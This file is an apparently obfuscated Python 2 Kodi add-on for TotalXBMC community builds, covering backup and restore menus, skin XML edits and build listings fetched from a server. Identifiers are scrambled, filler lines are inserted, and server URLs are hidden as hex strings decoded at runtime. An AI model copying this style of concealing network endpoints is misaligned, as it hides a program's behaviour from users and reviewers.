 if 9 - 9: iiIi % iiIi % I1i1iii
def I1I1i1I ( ) :
 Ii ( '' , '[COLOR=lime]Full Backup[/COLOR]' , 'url' , 'community_backup' , 'Backup.png' , '' , '' , 'Back Up Your Full System' )
 Ii ( '' , 'Backup Just Your Addons' , 'addons' , 'restore_zip' , 'Backup.png' , '' , '' , 'Back Up Your Addons' )
 Ii ( '' , 'Backup Just Your Addon UserData' , 'addon_data' , 'restore_zip' , 'Backup.png' , '' , '' , 'Back Up Your Addon Userdata' )
 Ii ( '' , 'Backup Guisettings.xml' , o0oOoO00o , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your guisettings.xml' )
 if os . path . exists ( i11 ) :
  Ii ( '' , 'Backup Favourites.xml' , i11 , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your favourites.xml' )
 if os . path . exists ( I11 ) :
  Ii ( '' , 'Backup Source.xml' , I11 , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your sources.xml' )
 if os . path . exists ( Oo0o0000o0o0 ) :
  Ii ( '' , 'Backup Advancedsettings.xml' , Oo0o0000o0o0 , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your advancedsettings.xml' )
 if os . path . exists ( oo0o0O00 ) :
  Ii ( '' , 'Backup Advancedsettings.xml' , oo0o0O00 , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your keyboard.xml' )
 if os . path . exists ( oO0o0o0ooO0oO ) :
  Ii ( '' , 'Backup RssFeeds.xml' , oO0o0o0ooO0oO , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your RssFeeds.xml' )
  if 87 - 87: O0OOO / Ii1iIIIi1ii * o0oO
  if 41 - 41: OoOo * Oo000o / OoOo % OOO00OoOO00
def IioO0oOOO0Ooo ( ) :
 Ii ( 'folder' , 'Backup My Content' , 'none' , 'backup_option' , 'Backup.png' , '' , '' , '' )
 Ii ( 'folder' , 'Restore My Content' , 'none' , 'restore_option' , 'Restore.png' , '' , '' , '' )
 if 38 - 38: iiIi
 if 84 - 84: OOO00OoOO00 % o0oO
def oOOIi1II ( localbuildcheck , localversioncheck , id , welcometext ) :
 O0Oo00 = 0
 ii1IiIIi1i = OO0o . getSetting ( 'addonportal' )
 oOOo0OOOOo0Oo = OO0o . getSetting ( 'maintenance' )
 OOo0o = OO0o . getSetting ( 'hardwareportal' )
 ooo = OO0o . getSetting ( 'maintenance' )
 ii1iiIi1 = OO0o . getSetting ( 'latestnews' )
 i111iiI1ii = OO0o . getSetting ( 'tutorialportal' )
 if ( OOOo0 in welcometext ) and ( 'elc' in welcometext ) :
  O0Oo00 = 1
  Ii ( '' , welcometext , 'show' , 'user_info' , 'TOTALXBMC.png' , '' , '' , '' )
  if id != 'None' :
   if id != 'Local' :
    IIiii = I1i1i ( localbuildcheck , localversioncheck , id )
    if IIiii == True :
     Ii ( '' , '[COLOR=dodgerblue]' + localbuildcheck + ':[/COLOR] [COLOR=lime]NEW VERSION AVAILABLE[/COLOR]' , id , 'showinfo' , 'TOTALXBMC.png' , '' , '' , '' )
    else :
     Ii ( '' , '[COLOR=lime]Current Build Installed: [/COLOR][COLOR=dodgerblue]' + localbuildcheck + '[/COLOR]' , id , 'showinfo' , 'TOTALXBMC.png' , '' , '' , '' )
   else :
    if localbuildcheck == 'Incomplete' :
     Ii ( '' , '[COLOR=lime]Your last restore is not yet completed[/COLOR]' , 'url' , OOOO ( ) , 'TOTALXBMC.png' , '' , '' , '' )
    else :
     Ii ( '' , '[COLOR=lime]Current Build Installed: [/COLOR][COLOR=dodgerblue]Local Build (' + localbuildcheck + ')[/COLOR]' , 'TOTALXBMC.png' , '' , '' , '' , '' , '' )
  Ii ( '' , '[COLOR=gold]----------------------------------------------[/COLOR]' , 'None' , '' , 'TOTALXBMC.png' , '' , '' , '' )
 if OOOo0 != '' and Oooo000o != '' and O0Oo00 != 1 and Oo0O == 'true' :
  Ii ( '' , '[COLOR=lime]Unable to login, please check your details[/COLOR]' , 'None' , 'addon_settings' , 'TOTALXBMC.png' , '' , '' , '' )
 if Oo0O == 'true' and O0Oo00 != 1 :
  Ii ( '' , welcometext , 'None' , 'register' , 'TOTALXBMC.png' , '' , '' , '' )
 Ii ( '' , '[COLOR=yellow]Settings[/COLOR]' , 'settings' , 'addon_settings' , 'SETTINGS.png' , '' , '' , '' )
 if ii1IiIIi1i == 'true' :
  Ii ( 'folder' , 'Add-on Portal' , welcometext , 'addonmenu' , 'Search_Addons.png' , '' , '' , '' )
 if oOOo0OOOOo0Oo == 'true' and ( OOOo0 in welcometext ) and ( 'elc' in welcometext ) :
  Ii ( 'folder' , 'Community Builds' , welcometext , 'community' , 'Community_Builds.png' , '' , '' , '' )
 if OOo0o == 'true' :
  Ii ( 'folder' , 'Hardware Reviews' , 'none' , 'hardware_root_menu' , 'hardware.png' , '' , '' , '' )
 if ii1iiIi1 == 'true' :
  Ii ( 'folder' , 'Latest News' , 'none' , 'news_root_menu' , 'LatestNews.png' , '' , '' , '' )
 if i111iiI1ii == 'true' :
  Ii ( 'folder' , 'Tutorials' , '' , 'tutorial_root_menu' , 'TotalXBMC_Guides.png' , '' , '' , '' )
 if ooo == 'true' :
  Ii ( 'folder' , 'Maintenance' , 'none' , 'tools' , 'Additional_Tools.png' , '' , '' , '' )
  if 88 - 88: ooOO0o
  if 19 - 19: I1i1iii * O0oO + OoO0O00
def O0o ( welcometext ) :
 oO00oO = xbmc . getInfoLabel ( "System.BuildVersion" )
 IIIIiiIiiI = float ( oO00oO [ : 4 ] )
 if II1 == 'true' :
  if O00ooooo00 == 'true' :
   i11i1iIiii ( 'yes' )
  if O00ooooo00 == 'false' :
   i11i1iIiii ( 'no' )
 if ooo0OO == 'true' :
  Ii ( 'folder' , '[COLOR=lime]Show My Private List[/COLOR]' , '&visibility=private' , 'grab_builds' , 'Private_builds.png' , '' , '' , '' )
 if ( OOOo0 in welcometext ) and ( 'elc' in welcometext ) :
  if IIIIiiIiiI < 14 :
   Ii ( 'folder' , '[COLOR=orange]Show All Gotham Compatible Builds[/COLOR]' , '&visibility=public' , 'grab_builds' , 'TRCOMMUNITYGOTHAMBUILDS.png' , '' , '' , '' )
  if IIIIiiIiiI >= 14 :
   Ii ( 'folder' , '[COLOR=orange]Show All Helix Compatible Builds[/COLOR]' , '&visibility=public' , 'grab_builds' , 'TRCOMMUNITYHELIXBUILDS.png' , '' , '' , '' )
 Ii ( 'folder' , 'Restore a locally stored Community Build' , 'url' , 'restore_local_CB' , 'Restore.png' , '' , '' , 'Back Up Your Full System' )
 Ii ( 'folder' , 'Create My Own Community Build' , 'url' , 'community_backup' , 'Backup.png' , '' , '' , 'Back Up Your Full System' )
 if 71 - 71: Ooo0Oo0 % oO00Oo0o000 - iiIi % Oo000o - O0OOO
 if 67 - 67: oOOoO0O0O0 + iiiIi1i1I
def OoOo000oOo0oo ( skin ) :
 oO0O = '<onleft>%s</onleft>'
 oOOiiiIIiIi = '<onright>%s</onright>'
 OooOOO = '<onup>%s</onup>'
 Ii1iI11iI1 = '<ondown>%s</ondown>'
 i11I1II = '<control type="button" id="%s">'
 OO0OOO0oOOo00O = [ ( '65' , '140' ) , ( '66' , '164' ) , ( '67' , '162' ) , ( '68' , '142' ) , ( '69' , '122' ) , ( '70' , '143' ) , ( '71' , '144' ) , ( '72' , '145' ) , ( '73' , '127' ) , ( '74' , '146' ) , ( '75' , '147' ) , ( '76' , '148' ) , ( '77' , '166' ) , ( '78' , '165' ) , ( '79' , '128' ) , ( '80' , '129' ) , ( '81' , '120' ) , ( '82' , '123' ) , ( '83' , '141' ) , ( '84' , '124' ) , ( '85' , '126' ) , ( '86' , '163' ) , ( '87' , '121' ) , ( '88' , '161' ) , ( '89' , '125' ) , ( '90' , '160' ) ]
 for OO0oIII111i11IiI , O0000 in OO0OOO0oOOo00O :
  ooO00O0O0 = open ( skin ) . read ( )
  iII1I1 = ooO00O0O0 . replace ( i11I1II % OO0oIII111i11IiI , i11I1II % O0000 ) . replace ( oO0O % OO0oIII111i11IiI , oO0O % O0000 ) . replace ( oOOiiiIIiIi % OO0oIII111i11IiI , oOOiiiIIiIi % O0000 ) . replace ( OooOOO % OO0oIII111i11IiI , OooOOO % O0000 ) . replace ( Ii1iI11iI1 % OO0oIII111i11IiI , Ii1iI11iI1 % O0000 )
  IiI11i1IIiiI = open ( skin , mode = 'w' )
  IiI11i1IIiiI . write ( iII1I1 )
  IiI11i1IIiiI . close ( )
  if 85 - 85: ooOO0o * iii11I111
def ii1iii11i1 ( u , skin ) :
 print skin
 oO0O = '<onleft>%s</onleft>'
 oOOiiiIIiIi = '<onright>%s</onright>'
 OooOOO = '<onup>%s</onup>'
 Ii1iI11iI1 = '<ondown>%s</ondown>'
 i11I1II = '<control type="button" id="%s">'
 if u < 49 :
  I11Oo00oO0O = u + 61
 else :
  I11Oo00oO0O = u + 51
 ooO00O0O0 = open ( skin ) . read ( )
 iII1I1 = ooO00O0O0 . replace ( oO0O % u , oO0O % I11Oo00oO0O ) . replace ( oOOiiiIIiIi % u , oOOiiiIIiIi % I11Oo00oO0O ) . replace ( OooOOO % u , OooOOO % I11Oo00oO0O ) . replace ( Ii1iI11iI1 % u , Ii1iI11iI1 % I11Oo00oO0O ) . replace ( i11I1II % u , i11I1II % I11Oo00oO0O )
 IiI11i1IIiiI = open ( skin , mode = 'w' )
 IiI11i1IIiiI . write ( iII1I1 )
 IiI11i1IIiiI . close ( )
 if 96 - 96: Ooo0Oo0 / I1i1iii . OoO0O00 - ooOO0o * Oo000o * OOO00OoOO00
 if 76 - 76: OoO0O00 - I1i1iii * oOOoO0O0O0 / Iii1i1I11I
def IIIiIi ( ) :
 Iii = xbmc . translatePath ( os . path . join ( zip , 'testCBFolder' ) )
 if not os . path . exists ( zip ) :
  IiI . ok ( '[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]' , 'The download location you have stored does not exist .\nPlease update the addon settings and try again.' , '' , '' )
  OO0o . openSettings ( sys . argv [ 0 ] )
  if 6 - 6: oOOoO0O0O0 - Ooo0Oo0 + OoO0O00 + o0oO / O0OOO / iii11I111
  if 42 - 42: o0oO . iiIi / o0oO + OoO0O00
def I1i1i ( localbuildcheck , localversioncheck , id ) :
 O0o0O0OO00o = '687474703a2f2f746f74616c78626d632e74762f746f74616c7265766f6c7574696f6e2f436f6d6d756e6974795f4275696c64732f6275696c647570646174652e7068703f69643d2573'
 i1iIi = binascii . unhexlify ( O0o0O0OO00o ) % ( id )
 ooOOoooooo = II1I ( i1iIi ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if id != 'None' :
  OOo00O = re . compile ( 'version="(.+?)"' ) . findall ( ooOOoooooo )
  o0 = OOo00O [ 0 ] if ( len ( OOo00O ) > 0 ) else ''
 if localversioncheck < o0 :
  return True
 else :
  return False
  if 20 - 20: Iii1i1I11I * iii11I111 * O0OOO . oOOoO0O0O0
  if 78 - 78: Ii1iIIIi1ii + Oo000o - OoO0O00 * i1OOO - Iii1i1I11I % OoOo
def i1OoOO ( url ) :
 time . sleep ( 120 )
 if os . path . exists ( ooOoOoo0O ) :
  iIII1I1i1i = xbmcgui . Dialog ( ) . yesno ( 'Run step 2 of install' , 'You still haven\'t completed step 2 of the' , 'install. Would you like to complete it now?' , '' , nolabel = 'No, not yet' , yeslabel = 'Yes, complete setup' )
  if iIII1I1i1i == 0 :
   i1OoOO ( url )
  elif iIII1I1i1i == 1 :
   try : xbmc . executebuiltin ( "PlayerControl(Stop)" )
   except : pass
   xbmc . executebuiltin ( "ActivateWindow(appearancesettings)" )
   o0OIIiI1I1 ( url , I11I1IIiiII1 )
   if 31 - 31: iiIi * OOO00OoOO00 + Iii1i1I11I - ooOO0o / Iii1i1I11I
   if 19 - 19: O0oO * oO00Oo0o000 * iii11I111 + O0OOO / O0OOO
def OOOO ( ) :
 ooOoO = open ( ii11iIi1I , mode = 'r' )
 oOoOOOo = file . read ( ooOoO )
 file . close ( ooOoO )
 ii1I = re . compile ( 'name="(.+?)"' ) . findall ( oOoOOOo )
 o0OOoOoO00 = ii1I [ 0 ] if ( len ( ii1I ) > 0 ) else ''
 if o0OOoOoO00 == "Incomplete" :
  iIII1I1i1i = xbmcgui . Dialog ( ) . yesno ( "Finish Restore Process" , 'If you\'re certain the correct skin has now been set click OK' , 'to finish the install process, once complete XBMC/Kodi will' , ' then close. Do you want to finish the install process?' , yeslabel = 'Yes' , nolabel = 'No' )
  if iIII1I1i1i == 1 :
   I1iii ( )
  elif iIII1I1i1i == 0 :
   return
   if 51 - 51: Ooo0Oo0
def III1I1Ii11iI ( ) :
 Iii = xbmc . translatePath ( os . path . join ( zip , 'testCBFolder' ) )
 try :
  os . makedirs ( Iii )
  os . removedirs ( Iii )
  IiI . ok ( '[COLOR=lime]SUCCESS[/COLOR]' , 'Great news, the path you chose is writeable.' , 'Some of these builds are rather big, we recommend' , 'a minimum of 1GB storage space.' )
 except :
  IiI . ok ( '[COLOR=red]CANNOT WRITE TO PATH[/COLOR]' , 'Kodi cannot write to the path you\'ve chosen. Please click OK' , 'in the settings menu to save the path then try again.' , 'Some devices give false results, we recommend using a USB stick as the backup path.' )
  if 52 - 52: oOOoO0O0O0 - ooOO0o * OOO00OoOO00
  if 17 - 17: Iii1i1I11I + oOOoO0O0O0 * Oo000o * OoOo
def iiIii1I ( data ) :
 data = data . replace ( '</p><p>' , '[CR][CR]' ) . replace ( '&ndash;' , '-' ) . replace ( '&mdash;' , '-' ) . replace ( "\n" , " " ) . replace ( "\r" , " " ) . replace ( "&rsquo;" , "'" ) . replace ( "&rdquo;" , '"' ) . replace ( "</a>" , " " ) . replace ( "&hellip;" , '...' ) . replace ( "&lsquo;" , "'" ) . replace ( "&ldquo;" , '"' )
 data = " " . join ( data . split ( ) )
 i1I11iIiII = re . compile ( r'< script[^<>]*?>.*?< / script >' )
 data = i1I11iIiII . sub ( '' , data )
 i1I11iIiII = re . compile ( r'< style[^<>]*?>.*?< / style >' )
 data = i1I11iIiII . sub ( '' , data )
 i1I11iIiII = re . compile ( r'' )
 data = i1I11iIiII . sub ( '' , data )
 i1I11iIiII = re . compile ( r'<[^<]*?>' )
 data = i1I11iIiII . sub ( '' , data )
 data = data . replace ( '&nbsp;' , ' ' )
 return data
 if 66 - 66: iiiIi1i1I - iii11I111 * O0oO + OoOo + iii11I111 - Ii1iIIIi1ii
 if 17 - 17: OOO00OoOO00
def i1ii11 ( ) :
 iIII1I1i1i = xbmcgui . Dialog ( ) . yesno ( 'Clear All Known Cache?' , 'This will clear all known cache files and can help' , 'if you\'re encountering kick-outs during playback.' , 'as well as other random issues. There is no harm in using this.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if iIII1I1i1i == 1 :
  ii1i ( )
  IIioo0OO ( )
  if 2 - 2: I1i1iii - II11iII . O0oO * ooOO0o / OOO00OoOO00
  if 80 - 80: oOOoO0O0O0 / Oo000o / OoOo + o0oO - iiiIi1i1I
def iIIiiIIi1IiI ( url ) :
 Ii ( 'folder' , 'African' , str ( url ) + '&genre=african' , 'grab_builds' , 'african.png' , '' , '' , '' )
 Ii ( 'folder' , 'Arabic' , str ( url ) + '&genre=arabic' , 'grab_builds' , 'arabic.png' , '' , '' , '' )
 Ii ( 'folder' , 'Asian' , str ( url ) + '&genre=asian' , 'grab_builds' , 'asian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Australian' , str ( url ) + '&genre=australian' , 'grab_builds' , 'australian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Austrian' , str ( url ) + '&genre=austrian' , 'grab_builds' , 'austrian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Belgian' , str ( url ) + '&genre=belgian' , 'grab_builds' , 'belgian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Brazilian' , str ( url ) + '&genre=brazilian' , 'grab_builds' , 'brazilian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Canadian' , str ( url ) + '&genre=canadian' , 'grab_builds' , 'canadian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Columbian' , str ( url ) + '&genre=columbian' , 'grab_builds' , 'columbian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Czech' , str ( url ) + '&genre=czech' , 'grab_builds' , 'czech.png' , '' , '' , '' )
 Ii ( 'folder' , 'Danish' , str ( url ) + '&genre=danish' , 'grab_builds' , 'danish.png' , '' , '' , '' )
 Ii ( 'folder' , 'Dominican' , str ( url ) + '&genre=dominican' , 'grab_builds' , 'dominican.png' , '' , '' , '' )
 Ii ( 'folder' , 'Dutch' , str ( url ) + '&genre=dutch' , 'grab_builds' , 'dutch.png' , '' , '' , '' )
 Ii ( 'folder' , 'Egyptian' , str ( url ) + '&genre=egyptian' , 'grab_builds' , 'egyptian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Filipino' , str ( url ) + '&genre=filipino' , 'grab_builds' , 'filipino.png' , '' , '' , '' )
 Ii ( 'folder' , 'Finnish' , str ( url ) + '&genre=finnish' , 'grab_builds' , 'finnish.png' , '' , '' , '' )
 Ii ( 'folder' , 'French' , str ( url ) + '&genre=french' , 'grab_builds' , 'french.png' , '' , '' , '' )
 Ii ( 'folder' , 'German' , str ( url ) + '&genre=german' , 'grab_builds' , 'german.png' , '' , '' , '' )
 Ii ( 'folder' , 'Greek' , str ( url ) + '&genre=greek' , 'grab_builds' , 'greek.png' , '' , '' , '' )
 Ii ( 'folder' , 'Hebrew' , str ( url ) + '&genre=hebrew' , 'grab_builds' , 'hebrew.png' , '' , '' , '' )
 Ii ( 'folder' , 'Hungarian' , str ( url ) + '&genre=hungarian' , 'grab_builds' , 'hungarian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Icelandic' , str ( url ) + '&genre=icelandic' , 'grab_builds' , 'icelandic.png' , '' , '' , '' )
 Ii ( 'folder' , 'Indian' , str ( url ) + '&genre=indian' , 'grab_builds' , 'indian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Irish' , str ( url ) + '&genre=irish' , 'grab_builds' , 'irish.png' , '' , '' , '' )
 Ii ( 'folder' , 'Italian' , str ( url ) + '&genre=italian' , 'grab_builds' , 'italian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Japanese' , str ( url ) + '&genre=japanese' , 'grab_builds' , 'japanese.png' , '' , '' , '' )
 Ii ( 'folder' , 'Korean' , str ( url ) + '&genre=korean' , 'grab_builds' , 'korean.png' , '' , '' , '' )
 Ii ( 'folder' , 'Lebanese' , str ( url ) + '&genre=lebanese' , 'grab_builds' , 'lebanese.png' , '' , '' , '' )
 Ii ( 'folder' , 'Mongolian' , str ( url ) + '&genre=mongolian' , 'grab_builds' , 'mongolian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Nepali' , str ( url ) + '&genre=nepali' , 'grab_builds' , 'nepali.png' , '' , '' , '' )
 Ii ( 'folder' , 'New Zealand' , str ( url ) + '&genre=newzealand' , 'grab_builds' , 'newzealand.png' , '' , '' , '' )
 Ii ( 'folder' , 'Norwegian' , str ( url ) + '&genre=norwegian' , 'grab_builds' , 'norwegian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Pakistani' , str ( url ) + '&genre=pakistani' , 'grab_builds' , 'pakistani.png' , '' , '' , '' )
 Ii ( 'folder' , 'Polish' , str ( url ) + '&genre=polish' , 'grab_builds' , 'polish.png' , '' , '' , '' )
 Ii ( 'folder' , 'Portuguese' , str ( url ) + '&genre=portuguese' , 'grab_builds' , 'portuguese.png' , '' , '' , '' )
 Ii ( 'folder' , 'Romanian' , str ( url ) + '&genre=romanian' , 'grab_builds' , 'romanian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Russian' , str ( url ) + '&genre=russian' , 'grab_builds' , 'russian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Singapore' , str ( url ) + '&genre=singapore' , 'grab_builds' , 'singapore.png' , '' , '' , '' )
 Ii ( 'folder' , 'Spanish' , str ( url ) + '&genre=spanish' , 'grab_builds' , 'spanish.png' , '' , '' , '' )
 Ii ( 'folder' , 'Swedish' , str ( url ) + '&genre=swedish' , 'grab_builds' , 'swedish.png' , '' , '' , '' )
 Ii ( 'folder' , 'Swiss' , str ( url ) + '&genre=swiss' , 'grab_builds' , 'swiss.png' , '' , '' , '' )
 Ii ( 'folder' , 'Syrian' , str ( url ) + '&genre=syrian' , 'grab_builds' , 'syrian.png' , '' , '' , '' )
 Ii ( 'folder' , 'Tamil' , str ( url ) + '&genre=tamil' , 'grab_builds' , 'tamil.png' , '' , '' , '' )
 Ii ( 'folder' , 'Thai' , str ( url ) + '&genre=thai' , 'grab_builds' , 'thai.png' , '' , '' , '' )
 Ii ( 'folder' , 'Turkish' , str ( url ) + '&genre=turkish' , 'grab_builds' , 'turkish.png' , '' , '' , '' )
 Ii ( 'folder' , 'UK' , str ( url ) + '&genre=uk' , 'grab_builds' , 'uk.png' , '' , '' , '' )
 Ii ( 'folder' , 'USA' , str ( url ) + '&genre=usa' , 'grab_builds' , 'usa.png' , '' , '' , '' )
 Ii ( 'folder' , 'Vietnamese' , str ( url ) + '&genre=vietnamese' , 'grab_builds' , 'vietnamese.png' , '' , '' , '' )
 if 14 - 14: O0oO % OOO00OoOO00 % iiiIi1i1I - i11iIiiIii
 if 53 - 53: OoO0O00 % iiiIi1i1I
def O0ooOo0o0Oo ( ) :
 OooO0oOo = 1
 IIIiIi ( )
 oOOo00O0OOOo = xbmc . translatePath ( os . path . join ( oO , 'Community Builds' , 'My Builds' , '' ) )
 i11I1I1iiI = xbmc . translatePath ( os . path . join ( oO , 'Community Builds' , 'My Builds' , 'my_full_backup.zip' ) )
 I1i1iii1Ii = xbmc . translatePath ( os . path . join ( oO , 'Community Builds' , 'My Builds' , 'my_full_backup_GUI_Settings.zip' ) )
 if not os . path . exists ( oOOo00O0OOOo ) :
  os . makedirs ( oOOo00O0OOOo )
 iI = O0O00OOo ( heading = "Enter a name for this backup" )
 if ( not iI ) : return False , 0
 OoOOo = urllib . quote_plus ( iI )
 iii1 = xbmc . translatePath ( os . path . join ( oOOo00O0OOOo , OoOOo + '.zip' ) )
 oOO0oo = [ 'plugin.program.totalinstaller' ]
 II1iIi1IiIii = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' ]
 I111I11I111 = [ 'plugin.program.totalinstaller' , 'plugin.program.community.builds' , 'cache' , 'system' , 'Thumbnails' , "peripheral_data" , 'library' , 'keymaps' ]
 iiiiI11ii = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , "Textures13.db" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'advancedsettings.xml' ]
 O0i1i1II1i11 = "Creating full backup of existing build"
 o00oiii11II1I = "Creating Community Build"
 iI111I11i = "Archiving..."
 I1 = ""
 II1i11I1 = "Please Wait"
 if oO00oOo == 'true' :
  OOOO00OO0O0 ( Oo , i11I1I1iiI , O0i1i1II1i11 , iI111I11i , I1 , II1i11I1 , oOO0oo , II1iIi1IiIii )
 iIII1I1i1i = xbmcgui . Dialog ( ) . yesno ( "Do you want to include your addon_data folder?" , 'This contains ALL addon settings including passwords.' , 'If you\'re intending on sharing this with others we stongly' , 'recommend against this unless all data has been manually removed.' , yeslabel = 'Yes' , nolabel = 'No' )
 if iIII1I1i1i == 0 :
  iiIiIiII ( )
 elif iIII1I1i1i == 1 :
  pass
 i1I1 ( Oo )
 iIi ( )
 OOOO00OO0O0 ( Oo , iii1 , o00oiii11II1I , iI111I11i , I1 , II1i11I1 , I111I11I111 , iiiiI11ii )
 time . sleep ( 1 )
 iIIiooO00O00oOO = xbmc . translatePath ( os . path . join ( oOOo00O0OOOo , OoOOo + '_guisettings.zip' ) )
 I1IIII1ii = zipfile . ZipFile ( iIIiooO00O00oOO , mode = 'w' )
 try :
  I1IIII1ii . write ( o0oOoO00o , 'guisettings.xml' , zipfile . ZIP_DEFLATED )
 except : OooO0oOo = 0
 try :
  I1IIII1ii . write ( xbmc . translatePath ( os . path . join ( Oo , 'userdata' , 'profiles.xml' ) ) , 'profiles.xml' , zipfile . ZIP_DEFLATED )
 except : pass
 I1IIII1ii . close ( )
 if oO00oOo == 'true' :
  IiIIi1I1I11Ii = zipfile . ZipFile ( I1i1iii1Ii , mode = 'w' )
  try :
   IiIIi1I1I11Ii . write ( o0oOoO00o , 'guisettings.xml' , zipfile . ZIP_DEFLATED )
  except : OooO0oOo = 0
  if 64 - 64: Iii1i1I11I
  try :
   IiIIi1I1I11Ii . write ( xbmc . translatePath ( os . path . join ( Oo , 'userdata' , 'profiles.xml' ) ) , 'profiles.xml' , zipfile . ZIP_DEFLATED )
  except : pass
  IiIIi1I1I11Ii . close ( )
 if OooO0oOo == 0 :
  IiI . ok ( "FAILED!" , 'The guisettings.xml file could not be found on your' , 'system, please reboot and try again.' , '' )
 else :
  IiI . ok ( "SUCCESS!" , 'You Are Now Backed Up. If you\'d like to share this build with' , 'the community please post details on the forum at' , '[COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B]' )
  IiI . ok ( "Build Locations" , 'Full Backup (only used to restore on this device): [COLOR=yellow]' + i11I1I1iiI , '[/COLOR]Universal Backup (can be used on any device): [COLOR=yellow]' + iii1 + '[/COLOR]' )
  if 81 - 81: Ooo0Oo0 - O0OOO * Iii1i1I11I
  if 23 - 23: I1i1iii / OOO00OoOO00
def iII1Iii1I11i ( url , video ) :
 i1o0oooO = 0
 ooOoo0oO0OoO0 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f436f6d6d756e6974795f4275696c64732f636f6d6d756e6974795f6275696c64735f7072656d69756d2e7068703f69643d2573'
 i1iIi = binascii . unhexlify ( ooOoo0oO0OoO0 ) % ( url )
 ooOOoooooo = II1I ( i1iIi ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOOOOOoOO = re . compile ( 'path="(.+?)"' ) . findall ( ooOOoooooo )
 oooo00 = re . compile ( 'myart="(.+?)"' ) . findall ( ooOOoooooo )
 i1oO = re . compile ( 'artpack="(.+?)"' ) . findall ( ooOOoooooo )
 OOO = re . compile ( 'videopreview="(.+?)"' ) . findall ( ooOOoooooo )
 iIIi1IIi = re . compile ( 'videoguide1="(.+?)"' ) . findall ( ooOOoooooo )
 i111i11I1ii = re . compile ( 'videoguide2="(.+?)"' ) . findall ( ooOOoooooo )
 OOooo = re . compile ( 'videoguide3="(.+?)"' ) . findall ( ooOOoooooo )
 oo0 = re . compile ( 'videoguide4="(.+?)"' ) . findall ( ooOOoooooo )
 oOOII1i11i1iIi11 = re . compile ( 'videoguide5="(.+?)"' ) . findall ( ooOOoooooo )
 oo0O0oO0O0O = re . compile ( 'videolabel1="(.+?)"' ) . findall ( ooOOoooooo )
 oOo0O = re . compile ( 'videolabel2="(.+?)"' ) . findall ( ooOOoooooo )
 I11i = re . compile ( 'videolabel3="(.+?)"' ) . findall ( ooOOoooooo )
 Iiii1 = re . compile ( 'videolabel4="(.+?)"' ) . findall ( ooOOoooooo )
 iIIIiiiI11I = re . compile ( 'videolabel5="(.+?)"' ) . findall ( ooOOoooooo )
 O0 = re . compile ( 'name="(.+?)"' ) . findall ( ooOOoooooo )
 I1ii1111Ii = re . compile ( 'author="(.+?)"' ) . findall ( ooOOoooooo )
 o00oooO0Oo = re . compile ( 'version="(.+?)"' ) . findall ( ooOOoooooo )
 o0OiiiI1i11Ii = re . compile ( 'description="(.+?)"' ) . findall ( ooOOoooooo )
 iIiII = re . compile ( 'DownloadURL="(.+?)"' ) . findall ( ooOOoooooo )
 i1i1IIIIIIIi = re . compile ( 'UpdateURL="(.+?)"' ) . findall ( ooOOoooooo )
 oo0o0oOo = re . compile ( 'UpdateDate="(.+?)"' ) . findall ( ooOOoooooo )
 OO0oOOo0o = re . compile ( 'UpdateDesc="(.+?)"' ) . findall ( ooOOoooooo )
 OOO00O0O = re . compile ( 'updated="(.+?)"' ) . findall ( ooOOoooooo )
 I1III11iiii11i1 = re . compile ( 'defaultskin="(.+?)"' ) . findall ( ooOOoooooo )
 ooOo0OoO = re . compile ( 'skins="(.+?)"' ) . findall ( ooOOoooooo )
 i1iiIIi1I = re . compile ( 'videoaddons="(.+?)"' ) . findall ( ooOOoooooo )
 iiI1I1IIi11i1 = re . compile ( 'audioaddons="(.+?)"' ) . findall ( ooOOoooooo )
 i1II1iii1i = re . compile ( 'programaddons="(.+?)"' ) . findall ( ooOOoooooo )
 OOO0o = re . compile ( 'pictureaddons="(.+?)"' ) . findall ( ooOOoooooo )
 iIIII1 = re . compile ( 'sources="(.+?)"' ) . findall ( ooOOoooooo )
 Oo00O0Oo0Oo = re . compile ( 'adult="(.+?)"' ) . findall ( ooOOoooooo )
 I1I11iO0 = re . compile ( 'guisettings="(.+?)"' ) . findall ( ooOOoooooo )
 if 39 - 39: iii11I111 . Ii1iIIIi1ii
 o0iIiiIiiIi = oooo00 [ 0 ] if ( len ( oooo00 ) > 0 ) else ''
 i1iiIIIi = i1oO [ 0 ] if ( len ( i1oO ) > 0 ) else ''
 Iii = oOOOOOoOO [ 0 ] if ( len ( oOOOOOoOO ) > 0 ) else ''
 ooooooo00o = O0 [ 0 ] if ( len ( O0 ) > 0 ) else ''
 Oo0o = I1ii1111Ii [ 0 ] if ( len ( I1ii1111Ii ) > 0 ) else ''
 IIIIiiIiiI = o00oooO0Oo [ 0 ] if ( len ( o00oooO0Oo ) > 0 ) else ''
 IIIII1 = o0OiiiI1i11Ii [ 0 ] if ( len ( o0OiiiI1i11Ii ) > 0 ) else 'No information available'
 i11II1I11I1 = OOO00O0O [ 0 ] if ( len ( OOO00O0O ) > 0 ) else ''
